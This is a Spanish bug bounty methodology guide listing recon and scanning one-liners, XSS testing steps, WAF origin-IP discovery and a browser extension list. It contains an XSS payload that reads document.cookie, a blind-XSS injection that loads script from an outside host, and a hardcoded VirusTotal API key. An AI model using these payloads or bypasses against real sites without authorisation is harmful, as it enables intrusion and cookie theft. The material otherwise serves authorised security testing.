# ***I. Bug Bounty***

`Bug Bounty Methodology` este documento sirve para tener una metodología a la hora de hacer bug bounty en programas BBP (bug bounty program) o VDP (vulnerability disclosure program). Donde encontraras comandos para ayudarte rapidamente a realizar bug bounty desde lo mas básico a lo avanzado.

### 1.1. Encontrar todos subdominios con subfinder de un dominio principal
   - ```bash 
      subfinder -d viator.com -all  -recursive > subdomain.txt
      ```
### 1.2. Usando httpx-toolkit para filtrar subdominio con código HTTP 200 y puertos 80,443,8080,8000,8888
   - ```bash 
      cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
      ```
### 1.3. Usando katana para el reconocimiento pasivo y excluye los recursos estáticos con las extensiones especificadas woff,css,png....
   - ```bash 
      katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
      ```
### 1.4. Filtrar por extensiones
   - ```bash 
      cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
      ```
### 1.5. Filtrar extensiones javascript
   - ```bash 
      cat allurls.txt | grep -E "\.js$" >> js.txt
      ```
### 1.6. Usando nuclei para ver encontrar Information disclosure
   - ```bash 
      cat js.txt | nuclei -t /home/paulportanc/nuclei-templates/http/exposures/ 
      ```
### 1.7. Usando nuclei para ver encontrar Information disclosure en un sitio web
   - ```bash 
      echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/paulportanc/nuclei-templates/http/exposures/ -c 30
      ```
### 1.8. Buscar con dirsearch directorios ocultos vulnerables
   - ```bash 
      dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
      ```
   - ```bash 
      dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
      ```
### 1.9. Buscar con subfinder, httpx, katana, gf, bxss en el sitio web vulnerabilidades xss
   - ```bash 
      subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
      ```
### 1.10. Ver certificados SSL vulnerable
   - ```bash 
      subzy run --targets subdomains_alive.txt --verify_ssl
      ```
   - ```bash 
      subzy run --targets subdomains_alive.txt --concurrency 100 --hide_fails --verify_ssl
      ```     
### 1.11. CORS
   - ```bash 
      python3 corsy.py -i /home/paulportanc/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
      ```
### 1.12. CORS con Nuclei
   - ```bash 
      nuclei -list subdomains_alive.txt -t /home/paulportanc/Priv8-Nuclei/cors
      ```
### 1.13. Nuclei
   - ```bash 
      nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
      ```
### 1.14. LFI
   - ```bash 
      cat allurls.txt | gf lfi | nuclei -tags lfi
      ```
### 1.15. OR Open Redirect
   - ```bash 
      cat allurls.txt | gf redirect | openredirex -p /home/paulportanc/openRedirect
      ```



-------------------------------------------------------------------------------------------------


# ***II. XSS***

`XSS Methodology` herramientas utilizadas.
- https://github.com/lc/gau   |   https://github.com/tomnomnom/gf   |   https://github.com/coffinxp/gFpattren   |   https://github.com/s0md3v/uro   |   https://github.com/KathanP19/Gxss   |   https://github.com/Emoe/kxss   |   https://github.com/coffinxp/loxs

### 2.1. Encontrar un campo de entrada como un buscar en una web, primero copiar un texto y si sale not found, con control + U vemos en el código fuente si el texto se guarda en el value.
   - ```bash 
      snow"><img src/onerror=prompt(document.cookie)>
      ```
### 2.2. Automatizando.
   - Buscamos mas campos que sean vulnerables a XSS
     ```bash 
      echo https://www.ejemplo.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
     ```
   - De los campos encontrados extraemos hasta donde inicia la busqueda para pasarlo por la herramienta de loxs
     ```bash 
      cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=' | sort -u > final.txt
      cat final.txt
      https://www.ejemplo.com/analog-watches?page=
      https://www.ejemplo.com/boxers?page=
      https://www.ejemplo.com/search?seach_key=
      https://www.ejemplo.com/home-storage-supplies?page=
      https://www.ejemplo.com/wall-clock?page=
      ....       
     ```     
   - Mover el archivo final.txt al directorio donde esta la herramienta loxs https://github.com/coffinxp/loxs
     ```bash 
      mv final.txt loxs
      cd loxs
      python loxs.py
     ```     
   - Elegir la opción 4 de la herramienta XSS Scanner. En la primera pregunta escribimos final.txt que buscara nuestro archivo que hemos movido al directorio de la herramienta. Y en la segunda pregunta escogemos e payload xss.txt, finalmente en el tiempo por cada solicitud damos enter.
     ```bash 
      [?] enter the pat to the input file containing URLs (or press enter to enter a single UR): final.txt
      [?] Enter the path to the payloads file: payloads/xss.txt
      Enter the timeout duration for each request (Press Enter for 0.5): "Presionar enter"
     ```

     
-------------------------------------------------------------------------------------------------


# ***III. JavaScript Reconocimiento***

### 3.1. Extraer todos los endpoint js.
   - ```bash 
      katana -u ejemplo.com -d 5 -jc | grep '\.js$' | tee alljs.txt
      ```
### 3.2. Obtener todas las URLs conocidas relacionadas con el dominio desde varias fuentes públicas y agregamos las nuevas URLs al archivo alljs.txt.
   - ```bash 
      echo ejemplo.com | gau | grep '\.js$' | anew alljs.txt
      ```
### 3.3. Comprobar las URLs listadas, seleccionando solo las que devuelven un código HTTP 200 (OK).
   - ```bash 
      cat alljs.txt | uro | sort -u | httpx-toolkit -mc 200 -o ejemplo.txt
      ```
### 3.4. Analizar los archivos JavaScript en busca de fugas de información.
   - ```bash 
      cat ejemplo.txt | jsleaks -s -l -katana
      ```
### 3.5. Escaneo de vulnerabilidades usando la plantilla especificada para buscar divulgación de credenciales. -c 30: Corre 30 hilos en paralelo para mayor velocidad
   - ```bash 
      cat ejemplo.txt | nuclei -t prsnl/credentials-disclosure-all.yaml -c 30
      ```
### 3.6. Similar al comando anterior, pero utiliza una plantilla diferente (http/exposures) para buscar exposiciones de datos.
   - ```bash 
      cat ejemplo.txt | nuclei -t /home/paulportanc/nuclei-template/http/exposures -c 30
      ```
### 3.7. Final.
   - ```bash 
      cat ejemplo.txt | xargs -I{} bash -c 'echo -e "\ntarget: {}\n' && python lazyegg.py "{}" --js_urls --domains --ips --leaked_creds --local_storage'
      ```

-------------------------------------------------------------------------------------------------


# ***IV. Encontrar la IP de origen de cualquier sitio web detrás de un waf***

### Paso 1: Encontrar la IP Origen.

1. Analizar el sitio web con la extensión Wappalyzer el sitio web.
2. Analizar el sitio web con la extensión Shodan para ver la dirección IP. Y acceder al sitio web con la IP que indica (puede que muestre una página de error, lo que significa que no se puede acceder a la IP directa).
3. Copiar el nombre del dominio y analizar en la terminal usando ping. Se podrá ver la IP del cloudfront y no del sitio web.
   ```bash
   ping ejemplo.com
   PING emeplo.com (XX.XX.XX.XX) 56 bytes of data.
   64 byte from server-XX-XX-XX-XX.del54.r.cloudfront.net 
   ```
4. Usar la herramienta de reconocimiento de DNS que a veces realiza bloqueos de DNS inversos. A veces puedes descubrir la IP de origen si el servidor no usa WAF. Sin embargo, en este caso vemos varios servidores cloudfront. Comprobemos las IP una por una del registro A. Ninguno de ellos es directamente accesible. Todos son IPS de Cloudflare
   ```bash
   dnsrecon -d ejemplo.com
   [*] std: Performin General Enumeration against: ejemplo.com...
   [-] DNSSEC is not configured for ejemplo.com
   [*] SOA ns-634.awsdns......
   [*] NS ns-634.awsdns......
   [*] MX ns-634.awsdns......
   [*] A ejemplo.com XX.XX.XX.105
   [*] A ejemplo.com XX.XX.XX.101
   [*] A ejemplo.com XX.XX.XX.45
   [*] A ejemplo.com XX.XX.XX.94   
   ```
5. Realizar un verificacion cruzada con la herramienta WAFW00F para identificarlos
   ```bash
   wafw00f https://ejemplo.com/
   ```
6. El siguiente paso usaré un Shodan Dork para encontrar todos los dominios relacionados. En https:///www.shodan.io/dashboard  copiar el siguiente Dork. Si encontramos resultado acceder a la IP una por una copiando la direccion IP publica y pegando en el navegador y si tiene suerte puedes ver que podras acceder directamente al sitio web con alguna de esas IP.
   ```bash
   Ssl.cert.subject.CN:"ejemplo.com" 200
   ```
   - También puedes usar este dork, te dará el mismo resultado.
   ```bash
   ssl:"ejemplo.com" 200
   ```
   - Ahora hagámoslo más fácil usando una línea de comando que le dará solo el resultado de la dirección IP junto con el título y el servidor.
   ```bash
   shodan search Ssl.cert.subject.CN:"ejemplo.com" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
   ```
7. Si aún no hemos encontrado la IP origen podemos seguir probando otro metodo, en el sitio web https://favicons.teamtailor-cdn.com/#result copiamos el sitio web https://ejemplo.com/
8. Puedes ver que tenemos la URL de favicon de este dominio. Ahora podemos generar su hash usando otro sitio web https://favicon-hash.kmsec.uk. Copiamos solo el dominio del favicon https://ejemplo.com/favicon.ico en Retrieve from URL y generamos su hash md5.
9. Ahora abramos este hash en shodan, puede que aparezcan resultado como tambien no aparecieron resultados para este hash.
10. Verificar el hash generado en Censys. La misma pagina de https://favicon-hash.kmsec.uk te da la opcion de buscar en Shodan, VirusTotal y Censys. Puede que obtengas resultados, acceder a esas IP una por una.
11. Comprobar el historial de IP del sitio web usando un sitio web de información de DNS https://viewdns.info y en la parte que dice IP History copiar el nombre del dominio ejemplo.com. Verá una lista de IP históricas. Puede probar estas IP una por una.
12. Otro sitio web para probar es verificar el registro SPF de un dominio, simplemente copie el dominio ejemplo.com en https://mxtoolbox.com/SuperTool.aspx?action=dmarc%adrop.com&run=toolpage#. En el boton viene por defecto DMARC Lookup cambiar o seleccionar por SPF Record Lookup.
13. De manera similar, ahora pasemos al siguiente sitio web, SecurityTrails, que uso para verificar los registros de IP https://securitytrails.com/app/account y pegamos el dominio para buscar ejemplo.com y haga clic en Historical Data. Puedes ver que hay tantos registros de IP de este sitio web, puedes copiar estas IP y comprobar si se puede acceder directamente a ellas o no.
14. En Censys https://search.censys.io ingresamos el dominio ejemplo.com y buscamos. Verás muchos resultados tanto con ipv4 como con ipv6.
15. También podemos utilizar FOFA https://en.fofa.info, otra excelente herramienta para encontrar IP. Solo copiamos el nombre del dominio "ejemplo.com". Podemos filtrarlo con el favicon del sitio para obtener resultado de ese sitio web.
16. Ahora pasemos a ZoomEye https://www.zoomeye.hk/v2/, que es otra gran alternativa para mostrar IPs, solo copiar el dominio "ejemplo.com" y hacer clic en buscar.
5. Otro método efectivo implica el uso de virus total, una excelente herramienta para descubrir subdominios y direcciones IP asociadas. Para comenzar, simplemente pegue el dominio en el parámetro de dominio y presione Entrar
   ```bash
   Ssl.cert.subject.CN:"ejemplo.com" 200
   ```
   ```bash
   https://www.virustotal.com/vtapi/v2/domain/report?apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f&domain=dell.com
   ```
   - Cambiar dell.com por el sitioweb ejemplo.com.
   - Como notará, virustotal proporciona una gran cantidad de información, incluidas muchas direcciones IP que el sitio web resuelve; sin embargo, verificar manualmente todas estas IP puede ser un desafío. Para facilitar este proceso, con este comando simple de una sola línea que recupera todas las direcciones IP usando una terminal, solo necesita copiar el comando y pegarlo en la terminal. Al instante verá una lista de direcciones IP obtenidas del sitio web.
      ```bash
      curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=ejemplo.com&apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f" | jq -r '.. | .ip_address? // empty' | grep -Eo'([0-9]{1,3}\.){3}[0-9]{1,3}'
      ```
   - Estoy usando httpx para este script, lo que hace que sea conveniente verificar qué IP son válidas y accesibles.
      ```bash
      curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=ejemplo.com&apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f" | jq -r '.. | .ip_address? // empty' | grep -Eo'([0-9]{1,3}\.){3}[0-9]{1,3}' | httpx-toolkit -sc -td -title -server
      ```
   - También puedes usar otro mismo trazador de líneas para buscar subdominios.
      ```bash
      curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f&domain=ejemplo.com" | jq -r '.domain_siblings[]'
      ```      
18. Ahora pase al siguiente método. Utilizo AlienVault para esto. También es bueno para encontrar el sitio web IP de origen. Simplemente cambie el dominio y presione enter: 
     ```bash
      https://otx.alienvault.com/api/v1/indicators/hostname/ejemplo.com/url_list?limit=500&page=1
    ```
    - Tambien puede utilizar este oneliner. Opcional puede agregar httpx-toolkit para verificar qué IP son válidas y accesibles.
      ```bash
      curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/ejemplo.com/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | httpx-toolkit -sc- td -title
      ```
19. Ahora, por último, pero no menos importante, también puedes probar el escaneo con urlscan para encontrar la IP de origen, simplemente cambia el dominio e ingresa.
     ```bash
      https://urlscan.io/api/v1/search/?q=domain:ejemplo.com&size=10000
    ```
    - Tambien puede utilizar este oneliner. Opcional puede agregar httpx-toolkit para verificar qué IP son válidas y accesibles.
      ```bash
      curl -s "https://urlscan.io/api/v1/search/?q=domain:ejemplo.com&size=10000" | jq -r '.result[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | httpx-toolkit -sc- td -title -server
      ```

### Paso 2: IP Origen encontrada.

1. Comprobarlo usando la extensión Wappalyzer que no hay cloudfront en el sitio web con la IP encontrada.
2. Para verificar más, consulta con la herramienta wafw00f y podras ver que no hay ningún waf.
   ```bash
   wafw00f XX.XX.XX.XX
   ```
3. Inspeccionemos también el certificado usando nmap. Se confirma que la IP apunta al sitio web
   ```bash
   nmap --script ssl-cert -p 443 XX.XX.XX.XX
   ssl-cert: Subject: commonName=*.ejemplo.com
   Subject Alternative Name: DNS:*.ejemplo.com, DNS: ejemplo.com
   ```
4. Agregar las IP origen al /etc/hosts para que cuando carge en el navegador resuelva con la IP origen y no con Cloudfare


-------------------------------------------------------------------------------------------------


# ***V. Encontrar errores de divulgación de información***

1. Recuperar todas las URL pasivas del dominio de destino utilizando la Wayback machine. Simplemente cambie el nombre de dominio a su objetivo. En este punto puedes buscar manualmente un archivo específico como pdf, csvc, archivos db y más para identificar vulnerabilidades de divulgación de información.
   ```bash
   https://web.archive.org/cdx/search/cdx?url=*.nasa.gov/*&collapse=urlkey&output=text&fl=original 
   ```
2. Este comando hace lo mismo pero de manera mas eficiente con una soli linea de codigo.
   ```bash
   curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=.ejemplo.com/" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > out.txt 
   ```
3. Este otro comando oneliner para buscar nombres de archivos confidenciales.
   ```bash
   cat out.txt | uro |  grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc' 
   ```
4. Si encuentran un archivo y cuando quieren abrir aparece Not found error 404. Mientras mucha gente se detiene aquí te mostraré un método de oro para recuperar estos archivos. Copie la URL que aparece el error 404, vaya a web https://web.archive.org y pegue la URL en la barra de búsqueda. Navegue en la  línea de tiempo y busque el archivado que tiene un snapshot en un fecha, y haga clic. Como vera puedes verlo aunque el archivo ya no esté en el servidor del sitio web, aún podemos acceder a él desde el archivo anterior.
5. Además, puede usar virustotal para búsquedas similares, simplemente reemplace el dominio por su dominio de destino y enumerará todas las URL asociadas, busque archivos con una extensión interesante y, si dan como resultado errores 404, verifique en Wayback Machine el archivo de línea de tiempo anterior. De manera similar, puede usar Alien Vault. para buscar URL y archivos de la misma manera que encontramos el archivo 404, simplemente verifíquelos en el camino de regreso.
   ```bash
   https://www.virustotal.com/vtapi/v2/domain/report?apikey=3c8812a869db20881601fc05d21a3ac8baca9a3f243357af29923c739c93a62f&domain=example.com 
   ```
   ```bash
   https://otx.alienvault.com/api/v1/indicators/hostname/example.com/url_list?limit=500&page=1 
   ``` 

   
-------------------------------------------------------------------------------------------------

# ***Extensiones para Bug Hunting***
   
| Extensiones | Descripción | URL | Browser | Logo | By |
| --- | --- | --- | --- | --- | --- |
| `EndPointer` | Analiza y extrae endpoints de aplicaciones web | https://addons.mozilla.org/en-US/firefox/addon/endpointer/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/e261f3e348bb9ba18e12fb671180633de99f6a38/extension-img/EndPointer.png "EndPointer") | `Interloper Security Group` |
| `Ripper Web Content - Capture Metadata Content` | Extensión que analiza y extrae metadatos del contenido encontrado en la web | https://chromewebstore.google.com/detail/ripper-web-content-captur/popfhajlkgkiecedhefhifccngogomgh | Chrome | ![alt text](https://github.com/paulportanc/Notas/blob/65ce6804513b18d14d764f6351772190ecfae667/extension-img/RipperWebContent.png "Ripper Web Content") | `Miguel Segovia` |
| `User-Agent Switcher for Chrome` | Puede cambiar de forma rápida y sencilla entre cadenas de agente de usuario | https://chromewebstore.google.com/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg | Chrome | ![alt text](https://github.com/paulportanc/Notas/blob/d2e5fd3473d58a0b7571c7cc8494be32ce51cc72/extension-img/User-Agent.png "User-Agent") | `Google 1600 Amphitheatre Pkwy Mountain View, CA 94043 US` |
| `HackBar` | Una extensión del navegador para pruebas de penetración, aparece en la opción de inspeccionar una URL  | https://chromewebstore.google.com/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc | Chrome | ![alt text](https://github.com/paulportanc/Notas/blob/efe4c1a0ea1a19b9bc64f9f9a4add2fdd0b500d4/extension-img/HackBar.png "HackBar") | `0140454` |
| `Max HacKBar` | Una extensión del navegador para pruebas de penetración, aparece en la opción de inspeccionar una URL  | https://addons.mozilla.org/es/firefox/addon/maxs-hackbar/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/efe4c1a0ea1a19b9bc64f9f9a4add2fdd0b500d4/extension-img/MaxHacKBar.png "Max HacKBar") | `Maxlab` |
| `Wappalyzer` | Esta extensión le ayudará a encontrar qué tecnología se ejecuta en el sitio web | https://addons.mozilla.org/es/firefox/addon/wappalyzer/ o https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg | Firefox y Chrome | ![alt text](https://github.com/paulportanc/Notas/blob/917e1efb909ad70a84ba5c8346eeb81963c86fc8/extension-img/Wappalyzer.png "Wappalyzer") | `Wappalyzer` |
| `WaybackURL` | Obtener todas las URL que Wayback Machine conoce para un dominio. Es un plugin tipo FFUZZ | https://addons.mozilla.org/en-US/firefox/addon/waybackurl/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/a09c8a99375d5899d7d8a8eb93688053f53d8520/extension-img/WaybackURL.png "WaybackURL") | `Hossein Shourabi` |
| `Temp Mail` | Esta extensión se utiliza para el servicio de correo temporal de forma rápida y sencilla | https://addons.mozilla.org/en-US/firefox/addon/temp-mail/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/70aa57238a65069a9b451b6f720b77dfe685882a/extension-img/TempMail.png "Temp Mail") | `Privatix` |
| `Hunter` | Encuentra direcciones de correo electrónico en segundos. Esta extensión se utiliza para buscar todos los correos electrónicos del sitio web y es mejor utilizarla para enviar informes sobre programas públicos | https://addons.mozilla.org/en-US/firefox/addon/hunterio/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/0c7a6f078d5e219c922475787193d2c818211b68/extension-img/Hunter.png "Hunter") | `Hunter` |
| `Trufflehog` | Esta extensión le ayuda a encontrar claves API ocultas en sitios web | https://addons.mozilla.org/en-US/firefox/addon/trufflehog/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/f8d0e85f718f55ca4582258064e9c18bb2254864/extension-img/Trufflehog.png "Trufflehog") | `Xhunt3r` |
| `FoxyProxy Standard` | Esta extensión es para usar burpsuite o cualquier otra aplicación de captura de proxy (mitm) | https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/daa2f5e5c8e9738d2ba9ee56fe8a5b611f6bd963/extension-img/FoxyProxyStandard.png "FoxyProxy Standard") | `Eric Jung, erosman` |
| `HackTools` | Esta extensión le brinda toda la información útil para probar el sitio de manera sencilla | https://addons.mozilla.org/en-US/firefox/addon/hacktools/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/2a04f9b8b4b08392d3d8dd13d8ebc8280ebd3d0a/extension-img/HackTools.png "HackTools") | `Riadh B. & Ludovic C.` |
| `CookieManager - Cookie Editor` | Esta es la mejor extensión para el editor de cookies y también le indicará si el sitio es http únicamente o si el indicador de seguridad está configurado o no. Otra alternativa https://cookie-editor.com/ | https://addons.mozilla.org/en-US/firefox/addon/edit-cookie/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/524832dbd7ec9f7f344b315f6b20d1e5b953d626/extension-img/CookieManager.png "HackTools") | `Joue` |
| `Disable WebRTC` | Esta extensión es el mejor uso para proteger su IP VPN del webrtc exposer | https://addons.mozilla.org/en-US/firefox/addon/happy-bonobo-disable-webrtc/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/2e090e13b2b8e5430436c9f575434c063dd2c897/extension-img/DisableWebRTC.png "Disable WebRTC") | `Chris Antaki` |
| `Link Gopher` | Esta extensión se utiliza para recuperar todos los dominios y enlaces de sitios web y resultados de Google | https://addons.mozilla.org/en-US/firefox/addon/link-gopher/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/1153f8ff9adbe275dcca47ef3233d071ac813f26/extension-img/LinkGopher.png "Link Gopher") | `Andrew Ziem` |
| `FindSomething` | Esta extensión se utiliza para encontrar posibles parámetros ocultos o claves secretas | https://addons.mozilla.org/en-US/firefox/addon/findsomething/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/b4bf22c8a12f128317ec6a1edb1930808627c52a/extension-img/FindSomething.png "FindSomething") | `residual.laugh` |
| `DotGit` | Esta extensión le ayudará a encontrar archivos .git en la divulgación de información p1 del sitio web | https://addons.mozilla.org/en-US/firefox/addon/dotgit/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/6028d403e29ede095d52b42f1869229f93d0386e/extension-img/DotGit.png "DotGit") | `davtur` |
| `Open Multiple URLs` | Esta extensión se utiliza para abrir varios sitios a la vez | https://addons.mozilla.org/en-US/firefox/addon/open-multiple-urls/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/50fd0dfcfa85496a3aa1796a8bc09f66bd5f40c5/extension-img/OpenMultipleURLs.png "Open Multiple URLs") | `ht` |
| `uBlock Origin` | Esta extensión es mejor para bloquear anuncios o rastreadores irritantes en sitios | https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/c2626d596a78233a08de407e8228b4ca0598800f/extension-img/uBlockOrigin.png "uBlock Origin") | `Raymond Hill` |
| `Dark Reader` | Esta extensión protegerá mejor sus ojos durante la noche mientras caza | https://addons.mozilla.org/en-US/firefox/addon/darkreader/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/3e1e24cd1e0e813b48d363057cd334420fb01a01/extension-img/DarkReader.png "Dark Reader") | `Dark Reader Ltd` |
| `User-Agent Switcher` | Esta extensión se utiliza para cambiar de agente de usuario y es mejor para probar el sitio con muchos agentes de usuario | https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/3f04196e833cb1ef093f4b0c5adb007a51002c00/extension-img/User-AgentSwitcher.png "User-Agent Switcher") | `ntninja` |
| `retire.js` | Esta extensión le indica todas las bibliotecas de JavaScript vulnerables | https://addons.mozilla.org/en-US/firefox/addon/retire-js/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/00c80a1bd8c03314a46d2a8551f99246dafc5fa3/extension-img/retire.js.png "retire.js") | `Francesco De Stefano` |
| `Shodan` | El complemento Shodan le indica dónde está alojado el sitio web (país, ciudad), quién es el propietario de la IP y qué otros servicios/puertos están abiertos | https://addons.mozilla.org/es/firefox/addon/shodan-addon/ | Firefox | ![alt text](https://github.com/paulportanc/Notas/blob/c80ff9b136cdb3a8bc787fd6ea818841fe948703/extension-img/Shodan.png "Shodan") | `Shodan` |
| `EXIF Viewer Pro` | Esta extensión le brindará acceso directo a los datos exif de cualquier foto, sin necesidad de visitar ningún sitio. Es útil para buscar errores, si encuentra algún sitio, siempre verifique la carga de la imagen de perfil con esta extensión si hay datos exif como la ubicación geográfica presentes en él. repórtelos o aumente el impacto incorporando xss y rce en esa imagen. | https://chromewebstore.google.com/detail/exif-viewer-pro/mmbhfeiddhndihdjeganjggkmjapkffm | Chrome | ![alt text](https://github.com/paulportanc/Notas/blob/e7f0cf2bfe15f96b1c0baf047bbe764e465fbd27/extension-img/EXIFViewerPro.png "EXIF Viewer Pro") | `exifviewers.com` |
| `BackLine Scanner` | Esta no es una extensión si no un marcador. Para usaro debes hacer clic en el marcador una vez que estes en el sitio web para que realice el scan| Pasos: 1.Add bookmark 2.Name: BlockLine Find Endpoint 3.URL: pegar todo el codigo de abajo | Cualquiera | https://github.com/paulportanc/BugBounty/blob/dc110cf40ae04566fd4175590a870a5e25a936e8/bookmarkscript.txt |  |


-------------------------------------------------------------------------------------------------


# ***Anonimato con Nipe***
   
   `NIPE` es un programa que usa la red Tor como puerta de enlace predeterminada del usuario, enrutando todo el tráfico en la red Tor, que a menudo se usa para brindar privacidad y anonimato. Permanecer en el anonimato es una excelente manera de protegerse de todo tipo de vigilancia..
   
## 6.1.Instalación
   - Paso 1: Colocarse en el /home/kali y crear el directorio nipe e ingresar.
     ```bash
     mkdir nipe
      cd nipe
     ```
   - Paso 2: Luego, clonar este repositorio desde GitHub.
     ```bash
     git clone https://github.com/htrgouvea/nipe
     ```     
   - Paso 3: Dentro habrá otro directorio llamado nipe, ingresar a el.
     ```bash
     cd nipe
     ```  
   - Paso 4: Ejecutar el siguiente comando para instalar las bibliotecas y dependencias.
     ```bash
     sudo cpan install Try::Tiny Config::Simple JSON
     ```  
   - Paso 5: Usar el siguiente comando para instalar las dependencias de Nipe o un script de Perl.
     ```bash
     sudo perl nipe.pl install
     ```  
    
## 6.2.Uso (ejecutar desde /home/kali/nipe/nipe)
   - Paso 1: Verificar el estado de nipe, escriba el siguiente comando. Y verás que el estado actual es deshabilitado. Aparecerá de la siguiente manera: El estado está deshabilitado y la IP es su IP Pública actual. La IP se puede validar ingreando al sitio https://www.whatismyip.com/.
     ```bash
     sudo perl nipe.pl status

      ┌──(kali㉿kali)-[~/nipe/nipe]
      └─$ sudo perl nipe.pl status

       [+] Status: false 
       [+] Ip: 38.25.30.53
     ```
   - Paso 2: Para iniciar el servicio Nipe. Luego ejecutar el comando status. El estado está en TRUE y la IP es una IP Pública de otro pais.
     ```bash
      sudo perl nipe.pl start

      ┌──(kali㉿kali)-[~/nipe/nipe]
      └─$ sudo perl nipe.pl status
        
       [+] Status: true 
       [+] Ip: 185.220.102.8
     ```     
   - **Nota** es probable que a la primera te aparezca el siguiente error: *[!] ERROR: sorry, it was not possible to establish a connection to the server.*  Si en caso de aparecer el siguiente error solo debes detener el estado con stop y luego volver a iniciar un par de veces hasta que en estado sea TRUE.     

> [!Warning]
> 
> # DISCLAIMER
> Este documento está destinado únicamente para fines educativos y de hacking ético. Sólo debe utilzarse para probar sistemas de su propiedad o para los que tenga permiso explícito para probar. El uso no autorizado de sitios web o sistemas de terceros sin consentimiento es ilegal y poco ético.
